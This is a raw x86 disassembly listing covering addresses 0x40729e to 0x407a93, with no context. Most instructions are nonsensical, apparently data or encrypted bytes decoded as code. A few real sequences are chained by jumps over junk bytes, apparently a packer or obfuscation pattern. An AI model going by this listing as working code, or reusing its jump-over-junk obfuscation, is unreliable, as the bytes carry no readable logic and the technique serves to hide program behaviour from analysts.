  40729e:	adc    esp,ebx
  4072a0:	sti    
  4072a1:	or     DWORD PTR [esi],esi
  4072a3:	dec    ebp
  4072a4:	enter  0xa5f8,0x9d
  4072a8:	or     DWORD PTR [esi],ebp
  4072aa:	mov    al,ds:0xee97d1a2
  4072af:	dec    esp
  4072b0:	push   ecx
  4072b1:	iret   
  4072b2:	sbb    al,ah
  4072b4:	sbb    BYTE PTR [ebx+0x38720034],cl
  4072ba:	call   0x6247:0xa310518
  4072c1:	jle    0x407268
  4072c3:	data16 sahf 
  4072c5:	cdq    
  4072c6:	mov    bl,0xcb
  4072c8:	cmp    bl,BYTE PTR [esi+0x18]
  4072cb:	ins    DWORD PTR es:[edi],dx
  4072cc:	adc    DWORD PTR [esi],edi
  4072ce:	inc    esi
  4072cf:	cmc    
  4072d0:	xlat   BYTE PTR ds:[ebx]
  4072d1:	mov    al,0xa4
  4072d3:	jle    0x4072ee
  4072d5:	jl     0x4072fb
  4072d7:	xchg   edx,eax
  4072d8:	xor    eax,0x421d23a3
  4072dd:	cmp    DWORD PTR [esi+0x21],esp
  4072e0:	lods   eax,DWORD PTR ds:[esi]
  4072e1:	jmp    0x4072c3
  4072e3:	cmp    DWORD PTR [ecx-0x4fdaedef],esi
  4072e9:	js     0x407357
  4072eb:	jge    0x407363
  4072ed:	cmp    ecx,DWORD PTR cs:[esi+0x6d599051]
  4072f4:	mov    ch,0xc8
  4072f6:	dec    esi
  4072f7:	lods   al,BYTE PTR ds:[esi]
  4072f9:	xor    al,0xd2
  4072fb:	jno    0x407351
  4072fd:	ins    DWORD PTR es:[edi],dx
  4072fe:	hlt    
  4072ff:	pop    edi
  407300:	mov    eax,ds:0xfef05e20
  407305:	cmp    DWORD PTR [ebp+0x3d],esi
  407308:	out    0x25,eax
  40730a:	call   0x9422:0xd363b5da
  407311:	mov    ecx,0x8be000d2
  407316:	inc    ebp
  407317:	clc    
  407318:	and    ecx,0x67ef
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x4306c6
  40732a:	sub    DWORD PTR ds:0x43061a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e8e2,0x43062a
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x430636,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi-0x4cfddca4]
  40736c:	cwde   
  40736d:	push   ds
  40736e:	daa    
  40736f:	or     edi,ecx
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x4073a0
  407378:	dec    ecx
  407379:	jnp    0x40731b
  40737b:	cmp    al,0xb8
  40737d:	jne    0x407384
  40737f:	pop    edi
  407380:	ss sbb esi,ebp
  407383:	sub    BYTE PTR [esi+0x3a844409],0xce
  40738a:	xchg   esp,eax
  40738b:	adc    eax,0x8ab81f80
  407390:	fimul  WORD PTR [eax+ecx*4+0xef22289]
  407397:	test   edx,esi
  407399:	mov    ds:0x5f7c46ac,eax
  40739e:	addr16 add al,0x44
  4073a1:	imul   esi,DWORD PTR [edi],0xffffffd3
  4073a4:	fwait
  4073a5:	loop   0x4073ef
  4073a7:	dec    ebp
  4073a8:	(bad)  
  4073a9:	idiv   dl
  4073ab:	test   eax,0xa88952c7
  4073b0:	pop    esi
  4073b1:	mov    esp,0x4dcdf14a
  4073b6:	xchg   esp,eax
  4073b7:	inc    ebp
  4073b8:	inc    ecx
  4073b9:	in     eax,dx
  4073ba:	(bad)  
  4073bb:	retf   0xd5c3
  4073be:	icebp  
  4073bf:	icebp  
  4073c0:	push   0x796cc3c3
  4073c5:	push   edi
  4073c6:	sbb    BYTE PTR [esi],bh
  4073c8:	pushf  
  4073c9:	fwait
  4073ca:	mov    eax,0x3f8970a8
  4073cf:	jl     0x40738b
  4073d1:	and    DWORD PTR [esi],eax
  4073d3:	jbe    0x40737d
  4073d5:	adc    BYTE PTR [ebx-0x23124a05],0xd
  4073dc:	mov    cl,0x69
  4073de:	xor    al,0xdc
  4073e0:	or     BYTE PTR [edi+0x78],bl
  4073e3:	xor    dh,BYTE PTR [ebp-0x50]
  4073e6:	xor    bl,BYTE PTR [eax+0x56a29def]
  4073ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073ed:	loope  0x4073a2
  4073ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073f0:	jae    0x40744a
  4073f2:	pop    ss
  4073f3:	aad    0x43
  4073f5:	add    cl,bh
  4073f7:	inc    ebx
  4073f8:	(bad)  
  4073f9:	inc    esi
  4073fa:	mov    al,0xcc
  4073fc:	ins    DWORD PTR es:[edi],dx
  4073fd:	fild   DWORD PTR [esi]
  4073ff:	mul    BYTE PTR [edx]
  407401:	mov    bh,0x31
  407403:	cmp    eax,0x76127930
  407408:	push   ds
  407409:	xchg   ebp,eax
  40740a:	pop    esi
  40740b:	ror    BYTE PTR [ecx+0x2fcbb79c],1
  407411:	cmc    
  407412:	adc    BYTE PTR [eax-0x2a],bl
  407415:	cmp    al,0x3c
  407417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407418:	pop    ebx
  407419:	xchg   ebx,eax
  40741a:	enter  0xc11c,0xf4
  40741e:	or     DWORD PTR [ebx+esi*1],ecx
  407421:	mov    bh,0x13
  407423:	pushf  
  407424:	add    al,0x7b
  407426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407427:	and    cl,dl
  407429:	jg     0x407454
  40742b:	aam    0x96
  40742d:	and    al,0xb8
  40742f:	loop   0x4073c4
  407431:	inc    ebx
  407432:	mov    ah,0xb5
  407434:	push   ss
  407435:	call   0x520728a
  40743a:	cmp    eax,0x541bc9cf
  40743f:	dec    eax
  407440:	and    DWORD PTR [edx-0xd901e37],ebx
  407446:	lods   eax,DWORD PTR ds:[esi]
  407447:	jb     0x40741e
  407449:	add    esp,DWORD PTR [edx]
  40744b:	in     al,dx
  40744c:	mov    esi,0x9ee08109
  407451:	pushf  
  407452:	js     0x4073dc
  407454:	push   edi
  407455:	mov    ds:0x79f5d59a,eax
  40745a:	outs   dx,DWORD PTR ds:[esi]
  40745b:	xchg   esp,eax
  40745c:	and    al,0x8
  40745e:	std    
  40745f:	push   edx
  407460:	and    edx,esp
  407462:	xor    dh,BYTE PTR [esi+0x89e54c9]
  407468:	(bad)  [esi]
  40746a:	mov    bh,0x88
  40746c:	push   edi
  40746d:	(bad)  
  40746e:	aam    0xb6
  407470:	mov    ecx,0x57b6d15c
  407475:	cmp    al,0x3a
  407477:	push   ds
  407478:	mov    cl,0x9e
  40747a:	iret   
  40747b:	ret    
  40747c:	cld    
  40747d:	push   edi
  40747e:	cmc    
  40747f:	jge    0x407466
  407481:	push   0x862f1c48
  407486:	loop   0x4074ba
  407488:	push   cs
  407489:	fs jo  0x407449
  40748c:	bound  ecx,QWORD PTR [edi]
  40748e:	jg     0x407450
  407490:	push   esi
  407491:	test   BYTE PTR ds:0x1e0546e1,0x1d
  407498:	add    eax,0xbb95d735
  40749d:	inc    ecx
  40749e:	int    0x88
  4074a0:	sahf   
  4074a1:	mov    ecx,0xc5777058
  4074a6:	test   BYTE PTR [ebp+ebx*1+0x44fcad0e],dh
  4074ad:	mov    al,0x7c
  4074af:	sbb    BYTE PTR [edi],0x38
  4074b2:	mov    esp,0x8656377f
  4074b7:	mov    DWORD PTR [ebx+0x71],ebp
  4074ba:	adc    edx,DWORD PTR [ecx+0x18e60efd]
  4074c0:	aam    0x64
  4074c2:	hlt    
  4074c3:	js     0x40752d
  4074c5:	cmp    eax,0x89742e47
  4074ca:	sub    BYTE PTR [eax+ebp*1],cl
  4074cd:	out    0xca,eax
  4074cf:	jo     0x4074eb
  4074d1:	push   eax
  4074d2:	gs mov edi,0x6e54abe3
  4074d8:	ret    
  4074d9:	and    bh,BYTE PTR [ebp+0xf40f883]
  4074df:	and    BYTE PTR [esi+edi*8-0x1],0xff
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	add    bl,0x5
  40750c:	mov    dl,0xed
  40750e:	sar    BYTE PTR [esi+0x7e],0xd2
  407512:	jg     0x407592
  407514:	jle    0x40758d
  407516:	bound  ecx,QWORD PTR [edi-0x57]
  407519:	fwait
  40751a:	stos   DWORD PTR es:[edi],eax
  40751b:	ins    BYTE PTR es:[edi],dx
  40751c:	push   es
  40751d:	cli    
  40751e:	mov    bl,0x31
  407520:	dec    ecx
  407521:	das    
  407522:	rcl    dh,1
  407524:	push   ebx
  407525:	xlat   BYTE PTR ds:[ebx]
  407526:	mov    eax,0xe792bc30
  40752b:	jb     0x4074c8
  40752d:	cmc    
  40752e:	rol    DWORD PTR [ebp+0x6],0x9f
  407532:	retf   0x46dc
  407535:	in     eax,0x50
  407537:	cmp    al,0x18
  407539:	jmp    0x4074c9
  40753b:	mov    esi,0xf0088776
  407540:	fisub  WORD PTR [esi-0x142cddd5]
  407546:	fsubr  QWORD PTR [edx-0xe]
  407549:	shl    bh,cl
  40754b:	sub    DWORD PTR [ebx+0x41e8e0b7],0xffffffbd
  407552:	sbb    al,0x4a
  407554:	lods   eax,DWORD PTR ds:[esi]
  407555:	jle    0x407579
  407557:	jb     0x407513
  407559:	pop    ebx
  40755a:	push   ss
  40755b:	sub    ah,0xbf
  40755e:	push   ebx
  40755f:	xor    DWORD PTR [ebx+0x5d],eax
  407562:	adc    DWORD PTR [eax+0x19],esi
  407565:	inc    ebp
  407566:	imul   ecx,esi,0x3b
  407569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40756a:	cmp    eax,DWORD PTR [esi]
  40756c:	cmp    cl,BYTE PTR [ebx+0x2]
  40756f:	mov    ah,0xe4
  407571:	sub    ah,BYTE PTR [ebx+eax*1]
  407574:	cli    
  407575:	push   es
  407576:	dec    edx
  407577:	add    BYTE PTR [edx],dl
  407579:	out    dx,al
  40757a:	cmp    al,BYTE PTR [esi+0x73]
  40757d:	mov    edx,0x87f5c71b
  407582:	dec    ecx
  407583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407584:	daa    
  407585:	or     ch,cl
  407587:	je     0x407579
  407589:	call   0x7f629ddc
  40758e:	push   ecx
  40758f:	lods   eax,DWORD PTR ds:[esi]
  407590:	and    dl,BYTE PTR [ebp-0x16ea397f]
  407596:	xor    al,0xf6
  407598:	push   edx
  407599:	int    0xfc
  40759b:	xchg   esi,eax
  40759c:	or     BYTE PTR [edi+0x8de82c7],cl
  4075a2:	sub    al,0x46
  4075a4:	retf   
  4075a5:	jbe    0x40752d
  4075a7:	test   DWORD PTR [esp+ecx*4-0x36410cc1],0x68fe9b61
  4075b2:	(bad)  
  4075b3:	test   eax,0x8136ab1e
  4075b8:	pop    esi
  4075b9:	cli    
  4075ba:	mov    esp,0x1f807164
  4075bf:	les    ebp,FWORD PTR [edx+0x75]
  4075c2:	mov    bl,0x28
  4075c4:	mov    DWORD PTR [edx+0x22],0x7a907584
  4075cb:	test   al,0x64
  4075cd:	mov    ebx,0xe71eda9c
  4075d2:	std    
  4075d3:	ins    BYTE PTR es:[edi],dx
  4075d4:	je     0x407577
  4075d6:	jae    0x40762c
  4075d8:	sub    esp,eax
  4075da:	test   eax,0x5962c39c
  4075df:	mov    al,ds:0xc5498493
  4075e4:	pop    ecx
  4075e5:	test   BYTE PTR [eax+0x3caf77b8],bl
  4075eb:	jecxz  0x407603
  4075ed:	fxch   st(5)
  4075ef:	push   ds
  4075f0:	mov    eax,ds:0xe0a28c10
  4075f5:	and    esi,DWORD PTR [ebx+0x28]
  4075f8:	jmp    0x7b89:0xcfe6186a
  4075ff:	lds    ebp,FWORD PTR [edi-0x51]
  407602:	in     eax,0xf4
  407604:	mov    ecx,0x5585f2c0
  407609:	adc    BYTE PTR ds:0x8ac8253d,cl
  40760f:	(bad)  
  407610:	or     al,BYTE PTR ds:0x52f7acbe
  407616:	cld    
  407617:	pop    ebx
  407618:	test   eax,0xa69c42e9
  40761d:	dec    ebx
  40761e:	pop    esi
  40761f:	outs   dx,BYTE PTR ds:[esi]
  407620:	(bad)  
  407622:	mov    WORD PTR [ebp+edx*1-0x2031afc9],cs
  407629:	out    0x81,eax
  40762b:	(bad)  
  40762c:	aas    
  40762d:	inc    ebp
  40762e:	inc    ecx
  40762f:	and    al,0xc1
  407631:	jns    0x40768f
  407633:	pop    edx
  407634:	and    BYTE PTR [ebx],bl
  407636:	adc    esp,DWORD PTR [edx]
  407638:	xchg   BYTE PTR [eax],bh
  40763a:	or     eax,0x581d09df
  40763f:	add    esp,DWORD PTR [eax+0x24a87f97]
  407645:	add    eax,0x11b3116b
  40764a:	adc    DWORD PTR [ecx+eax*8-0x6f],ebp
  40764e:	fadd   QWORD PTR [ecx+0x1c]
  407651:	(bad)  
  407652:	mov    edx,0x7a1595fa
  407657:	in     al,0x77
  407659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40765a:	ins    DWORD PTR es:[edi],dx
  40765b:	dec    ecx
  40765c:	cmp    ch,BYTE PTR [ecx+0x15]
  40765f:	dec    ebx
  407660:	dec    eax
  407661:	enter  0xf78f,0x8e
  407665:	out    dx,al
  407666:	ret    0x9d5f
  407669:	mov    bh,0x3d
  40766b:	jle    0x4076bb
  40766d:	sub    DWORD PTR [esi-0x54],edx
  407670:	lahf   
  407671:	xchg   esp,eax
  407672:	mov    al,0x17
  407674:	mov    ebx,0x7b63ca94
  407679:	mov    edi,DWORD PTR [ebp+0x8]
  40767c:	jmp    0x4077fd
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	jle    0x407614
  40768f:	xor    al,0x75
  407691:	inc    ecx
  407692:	sar    DWORD PTR [esi+0x7e],0xd2
  407696:	jg     0x407716
  407698:	jle    0x407640
  40769a:	adc    al,0xa2
  40769c:	lahf   
  40769d:	inc    ebp
  40769e:	scas   al,BYTE PTR es:[edi]
  40769f:	sub    esp,0x63
  4076a2:	cli    
  4076a3:	rol    DWORD PTR [eax],cl
  4076a5:	mov    cl,0x31
  4076a7:	test   eax,0xc21155f4
  4076ac:	out    dx,al
  4076ad:	jne    0x407636
  4076af:	jge    0x40765a
  4076b1:	jbe    0x4076c9
  4076b3:	stos   DWORD PTR es:[edi],eax
  4076b4:	loop   0x4076f9
  4076b6:	jmp    0x407730
  4076b8:	lea    edi,[ecx+0xd]
  4076bb:	mov    al,0x42
  4076bd:	ror    DWORD PTR [edi],cl
  4076bf:	inc    esi
  4076c0:	mov    al,ds:0x8b6b54a8
  4076c5:	or     dh,BYTE PTR [edx-0x6ecf5edc]
  4076cb:	mov    bl,0x1d
  4076cd:	imul   esi,edi,0x1d4ef30a
  4076d3:	jg     0x407676
  4076d5:	(bad)  
  4076d6:	imul   esp,DWORD PTR [ecx-0x2dbb4ebb],0x62b3bbd4
  4076e0:	jae    0x40775f
  4076e2:	xchg   edx,eax
  4076e3:	out    0xd4,eax
  4076e5:	pop    esi
  4076e6:	inc    esi
  4076e7:	js     0x4076aa
  4076e9:	add    eax,0xb3bc7b06
  4076ee:	out    dx,al
  4076ef:	dec    esi
  4076f0:	stos   DWORD PTR es:[edi],eax
  4076f1:	ins    BYTE PTR es:[edi],dx
  4076f2:	push   es
  4076f3:	popa   
  4076f4:	xor    edx,esi
  4076f6:	(bad)  
  4076f8:	sbb    ebp,DWORD PTR [ecx]
  4076fa:	push   0xffffffc3
  4076fc:	mov    ah,0x1b
  4076fe:	mov    DWORD PTR [eax+0x13],edi
  407701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407702:	sahf   
  407703:	push   ss
  407704:	ror    DWORD PTR [edx+0x66f05081],0xc6
  40770b:	lods   eax,DWORD PTR ds:[esi]
  40770c:	jbe    0x407733
  40770e:	add    DWORD PTR [edi+ebp*4],edx
  407711:	add    bh,BYTE PTR [ebx+0x3fbd8ebd]
  407717:	pop    ds
  407718:	(bad)  
  407719:	icebp  
  40771a:	inc    ecx
  40771b:	cmp    esp,ebp
  40771d:	shl    BYTE PTR [ebx-0x6],cl
  407720:	sub    BYTE PTR [esi],bh
  407722:	pop    esi
  407723:	mov    al,ds:0xd20bd530
  407728:	sub    bh,BYTE PTR [eax]
  40772a:	mov    cs,WORD PTR [ebp+0x67096eff]
  407730:	push   ss
  407731:	test   ebx,esi
  407733:	daa    
  407734:	enter  0x5f2,0x68
  407738:	clc    
  407739:	push   ebp
  40773a:	xchg   DWORD PTR [ecx+0x30],ebx
  40773d:	mov    ebx,0x59f69660
  407742:	call   0xaeff:0xfafcf6d3
  407749:	jbe    0x4076e8
  40774b:	add    dl,BYTE PTR [ebp-0x1e]
  40774e:	daa    
  40774f:	icebp  
  407750:	mov    al,ds:0x4ad0b572
  407755:	cli    
  407756:	mov    ds:0xefba615d,eax
  40775b:	test   DWORD PTR [eax+0x46b00a65],ebx
  407761:	inc    ebx
  407762:	outs   dx,BYTE PTR ds:[esi]
  407763:	sub    BYTE PTR [ecx-0x16],ah
  407766:	(bad)  
  407767:	(bad)  
  407768:	int    0x12
  40776a:	es enter 0xb53b,0x5
  40776f:	mov    edx,0x469d48ba
  407774:	leave  
  407775:	dec    ebp
  407776:	dec    ebp
  407777:	stc    
  407778:	pop    es
  407779:	or     DWORD PTR [eax+0x1b],edx
  40777c:	push   es
  40777d:	daa    
  40777e:	loope  0x407756
  407780:	inc    ecx
  407781:	cmp    BYTE PTR [eax],ch
  407783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407784:	jmp    0x634688cc
  407789:	pusha  
  40778a:	fadd   DWORD PTR [ecx+0x0]
  40778d:	mov    ch,0x1a
  40778f:	aaa    
  407790:	(bad)
  407793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407794:	pop    ebp
  407795:	pop    eax
  407796:	enter  0xad9a,0x6c
  40779a:	jle    0x4077d6
  40779c:	(bad)  
  40779d:	pop    ds
  40779e:	jmp    0x7006:0xbeb0f56f
  4077a5:	arpl   WORD PTR [ebp-0x3f],ax
  4077a8:	(bad)  [eax-0x43]
  4077ab:	mov    ecx,0x5f41775a
  4077b0:	push   esp
  4077b1:	pop    ecx
  4077b2:	out    0xbb,eax
  4077b4:	and    al,cl
  4077b6:	mov    bl,0x5d
  4077b8:	leave  
  4077b9:	mov    bl,bl
  4077bb:	add    dl,BYTE PTR [ebx]
  4077bd:	bound  edx,QWORD PTR [edi+0xd]
  4077c0:	mov    bl,BYTE PTR [ebx-0x3fb2f3fe]
  4077c6:	fdiv   st(3),st
  4077c8:	imul   cx,sp,0xffe2
  4077cc:	popa   
  4077cd:	not    BYTE PTR [edi+0x5ec9648c]
  4077d3:	add    ah,BYTE PTR [eax]
  4077d5:	jmp    0x8a158b34
  4077da:	sub    al,0x70
  4077dc:	sbb    edx,edx
  4077de:	xor    al,0xf9
  4077e0:	mov    cl,0xc9
  4077e2:	lods   al,BYTE PTR ds:[esi]
  4077e3:	xchg   ecx,eax
  4077e4:	fadd   st(6),st
  4077e6:	dec    ebx
  4077e7:	jo     0x40778d
  4077e9:	lea    eax,[ecx]
  4077eb:	rcr    DWORD PTR [esi-0x29],1
  4077ee:	mov    esi,0x813b04dc
  4077f3:	adc    ecx,DWORD PTR [ebx-0x29]
  4077f6:	push   eax
  4077f7:	adc    DWORD PTR [edi+0x67],0xb8fc90bb
  4077fe:	inc    eax
  4077ff:	mov    al,BYTE PTR [eax]
  407801:	add    BYTE PTR [esi+0x33],ah
  407804:	inc    esp
  407805:	xchg   edi,eax
  407806:	add    bh,BYTE PTR [edi+0x3b06]
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407821:	adc    BYTE PTR [esi+0x7ec3255b],bh
  407827:	jle    0x4077fb
  407829:	jg     0x4078a9
  40782b:	jle    0x407813
  40782d:	std    
  40782e:	or     BYTE PTR [eax+0x74f12045],al
  407834:	test   al,0x42
  407836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407837:	add    BYTE PTR [ecx],0x58
  40783a:	mov    ch,0x0
  40783c:	(bad)  
  40783d:	int3   
  40783e:	pop    eax
  40783f:	(bad)
  407842:	push   0x281c9b70
  407847:	add    al,0x2e
  407849:	cmp    BYTE PTR [eax+0x423f19b1],ch
  40784f:	les    eax,FWORD PTR [eax+edx*1-0x4b]
  407853:	jmp    0x6599:0xe606a8fc
  40785a:	and    eax,0x8172f0d1
  40785f:	mov    eax,0x3187530e
  407864:	push   ds
  407865:	dec    ebx
  407866:	xlat   BYTE PTR ds:[ebx]
  407867:	xor    DWORD PTR [esi+0x45],esi
  40786a:	das    
  40786b:	daa    
  40786c:	pop    edx
  40786d:	lds    esp,FWORD PTR [esi+0x21e288df]
  407873:	cmp    DWORD PTR [esi-0x64],ebp
  407876:	jg     0x40784f
  407878:	xchg   esi,eax
  407879:	mov    al,0xc7
  40787b:	les    ebp,FWORD PTR [edx+0x33]
  40787e:	xchg   ebx,eax
  40787f:	fiadd  WORD PTR ds:0xabe99030
  407885:	in     al,dx
  407886:	sub    esp,DWORD PTR [esi]
  407888:	inc    esp
  407889:	ins    DWORD PTR es:[edi],dx
  40788a:	int    0x6
  40788c:	cmc    
  40788d:	or     ch,bl
  40788f:	outs   dx,BYTE PTR ds:[esi]
  407890:	sub    BYTE PTR [edx-0x1d17e0e6],cl
  407896:	push   ecx
  407897:	xor    al,0x40
  407899:	imul   edi,DWORD PTR [edi],0x78
  40789c:	sub    DWORD PTR ds:0xad1b05b3,esp
  4078a2:	mov    ch,0x11
  4078a4:	inc    eax
  4078a5:	ret    0x5a5
  4078a8:	fldcw  WORD PTR [eax]
  4078aa:	sub    eax,0xb8b2ec3
  4078af:	jne    0x4078fb
  4078b1:	mov    ch,0x4d
  4078b3:	out    0xcc,eax
  4078b5:	inc    ecx
  4078b6:	adc    DWORD PTR [ebx-0x1e],eax
  4078b9:	out    0x2c,al
  4078bb:	adc    dh,dh
  4078bd:	sahf   
  4078be:	sub    BYTE PTR [edi+eiz*8-0x29b639e4],ah
  4078c5:	add    BYTE PTR [edx+0x7f],0xfa
  4078c9:	bound  eax,QWORD PTR [esi-0x2a]
  4078cc:	mov    cl,0x34
  4078ce:	jg     0x407947
  4078d0:	and    eax,edi
  4078d2:	test   eax,0xa0994eae
  4078d7:	leave  
  4078d8:	jnp    0x4078b1
  4078da:	ja     0x407864
  4078dc:	xor    ah,BYTE PTR [esi-0x5a1b7995]
  4078e2:	push   edi
  4078e3:	retf   
  4078e4:	pop    ebx
  4078e5:	(bad)  
  4078e6:	bound  ebx,QWORD PTR [edi-0x64f9e21f]
  4078ec:	mov    gs:0x4d0c5bcb,al
  4078f2:	mov    ecx,0xe0863b43
  4078f7:	lds    edx,FWORD PTR [esi]
  4078f9:	inc    eax
  4078fa:	lods   al,BYTE PTR ds:[esi]
  4078fb:	daa    
  4078fc:	and    dh,BYTE PTR [ecx]
  4078fe:	xor    esi,eax
  407900:	div    DWORD PTR [ebp+0x4279df59]
  407906:	imul   ecx,esp,0x7297a921
  40790c:	adc    bl,bl
  40790e:	xchg   edx,eax
  40790f:	mov    ds:0xf5576a3f,al
  407914:	xchg   edi,eax
  407915:	inc    esp
  407916:	jmp    0xca980bd6
  40791b:	cmp    eax,0x77457182
  407920:	cli    
  407921:	push   edx
  407922:	mov    BYTE PTR ds:0x156b8969,dl
  407928:	cs rcr eax,1
  40792b:	out    0xd8,eax
  40792d:	push   esp
  40792e:	stos   BYTE PTR es:[edi],al
  40792f:	xchg   esi,eax
  407930:	mov    edx,0x9cdaba95
  407935:	sub    esi,ebx
  407937:	adc    edx,DWORD PTR [ebp+0x5788b4c1]
  40793d:	je     0x4079a1
  40793f:	jb     0x4079b9
  407941:	mov    ds:0xeb65c90e,eax
  407946:	inc    ebp
  407947:	add    BYTE PTR [ecx],dh
  407949:	fisttp WORD PTR [edx-0x3f]
  40794c:	jmp    0x13c9c5a7
  407951:	adc    ecx,DWORD PTR [ecx+0x25]
  407954:	or     BYTE PTR [esi+esi*8+0x47991b7e],bh
  40795b:	cmp    BYTE PTR ds:0x105ee2d9,cl
  407961:	test   eax,0xa657c500
  407966:	sbb    al,0xa1
  407968:	push   eax
  407969:	sbb    BYTE PTR [ecx],0x9b
  40796c:	or     DWORD PTR [eax+0x7146f29f],ecx
  407972:	pop    ebp
  407973:	repnz adc dh,BYTE PTR [esi]
  407976:	add    eax,0xbfd6726b
  40797b:	jle    0x40796c
  40797d:	add    eax,0xa18333a3
  407982:	jge    0x4079cb
  407984:	pop    ss
  407985:	add    BYTE PTR [eax-0x77],cl
  407988:	inc    ebx
  407989:	data16 add cl,al
  40798c:	cmp    al,0x56
  40798e:	loopne 0x4079c3
  407990:	movzx  eax,ax
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	adc    edi,DWORD PTR [esi-0x3b660f71]
  4079ad:	jle    0x407a2d
  4079af:	sar    BYTE PTR [edi+0x7e],cl
  4079b2:	jle    0x407964
  4079b4:	cmp    eax,0xe30dad7f
  4079b9:	pop    esi
  4079ba:	add    eax,0x1cef7f17
  4079bf:	hlt    
  4079c0:	jb     0x4079e6
  4079c2:	adc    BYTE PTR [esi+0x78],0xe
  4079c6:	fbstp  TBYTE PTR [eiz*8+0x30c8febd]
  4079cd:	call   0x934126b1
  4079d2:	fnstsw WORD PTR [eax-0x3f08599c]
  4079d8:	sbb    ebp,eax
  4079da:	add    ecx,DWORD PTR [esi]
  4079dc:	in     eax,0x7a
  4079de:	je     0x407961
  4079e0:	mov    ds:0xec1c3673,al
  4079e5:	inc    ecx
  4079e6:	add    eax,0x7c12ea0
  4079eb:	dec    edi
  4079ec:	repz pop edi
  4079ee:	jle    0x407a6e
  4079f0:	ja     0x407a61
  4079f2:	xchg   DWORD PTR [ecx-0x8],esi
  4079f5:	jbe    0x4079bf
  4079f7:	add    BYTE PTR [eiz*4-0x5c7b49f0],dh
  4079fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079ff:	jae    0x407a1d
  407a01:	push   edi
  407a02:	dec    esi
  407a03:	pop    es
  407a04:	ins    BYTE PTR es:[edi],dx
  407a05:	call   0x2596a96a
  407a0a:	aad    0x5a
  407a0c:	inc    eax
  407a0d:	xor    DWORD PTR [edx+0x3b],ecx
  407a10:	and    bh,BYTE PTR [edi]
  407a12:	pop    ebp
  407a13:	jno    0x4079ff
  407a15:	mov    esi,0x64533a40
  407a1a:	sub    cl,dl
  407a1c:	and    DWORD PTR [eax-0x14],ecx
  407a1f:	dec    edi
  407a20:	adc    al,0x53
  407a22:	sti    
  407a23:	sub    edx,DWORD PTR [bx+si-0x6b]
  407a27:	aaa    
  407a28:	mov    bl,0x6b
  407a2a:	daa    
  407a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a2c:	lods   al,BYTE PTR ds:[esi]
  407a2d:	rcr    BYTE PTR [eax+eax*2-0x36d5e9b1],cl
  407a34:	mov    bl,0x68
  407a36:	pusha  
  407a37:	cdq    
  407a38:	enter  0xc083,0x1a
  407a3c:	cmp    al,0x80
  407a3e:	les    ebp,FWORD PTR [ebx]
  407a40:	push   esi
  407a41:	pop    ecx
  407a42:	xchg   esi,eax
  407a43:	loope  0x407a1c
  407a45:	imul   eax,ebx,0xa91fed9
  407a4b:	pop    ss
  407a4c:	fwait
  407a4d:	leave  
  407a4e:	and    eax,0xb6f7e87b
  407a53:	minps  xmm7,XMMWORD PTR fs:[edx+0x6e813c63]
  407a5b:	aas    
  407a5c:	mov    ebx,0x6c545730
  407a61:	and    bl,BYTE PTR [ebx-0x18]
  407a64:	xor    edi,DWORD PTR [eax]
  407a66:	mul    BYTE PTR [ebx+0x71]
  407a69:	push   cs
  407a6a:	sbb    dx,WORD PTR [esp+esi*8]
  407a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a6f:	lock ret 
  407a71:	fsubrp st(3),st
  407a73:	sub    edx,0x8ca13d18
  407a79:	imul   ebp
  407a7b:	repnz fadd st,st(2)
  407a7e:	pop    ds
  407a7f:	cwd    
  407a81:	dec    edi
  407a82:	shl    DWORD PTR [ebx],1
  407a84:	ror    BYTE PTR [eax+0x6e36f4ba],0x88
  407a8b:	sbb    DWORD PTR [ecx],edi
  407a8d:	test   DWORD PTR [ecx-0x3ac00897],ebp
  407a93:	fwait
